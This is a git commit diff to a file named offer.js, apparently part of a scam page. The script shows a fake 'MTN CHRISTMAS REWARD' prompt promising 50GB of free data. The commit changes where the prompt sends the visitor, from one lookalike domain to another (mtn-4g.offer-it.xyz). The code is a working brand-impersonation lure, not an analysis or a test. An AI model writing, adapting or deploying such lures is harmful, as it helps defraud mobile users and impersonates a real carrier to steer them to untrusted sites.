fe93da0abd1ea36a026c3f7f24c2b81824c4ef7b
uptomars <Kenoly555+me@gmail.com>
2025-12-25 07:52:58 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -2,5 +2,6 @@
 var password = '50GB DATA'
 password=prompt('SMS: Congratulations You are Eligible to receive 50GB Free Data MTN CHRISTMAS REWARD Valid For 30days, Kindly Press OK to ACTIVATE ','50GB DATA');
 if (password != '50GB DATA') {
-location.href='https://mtn.granddata.live/50GB';
+location.href='https://mtn-4g.offer-it.xyz/50GB';
 }
+
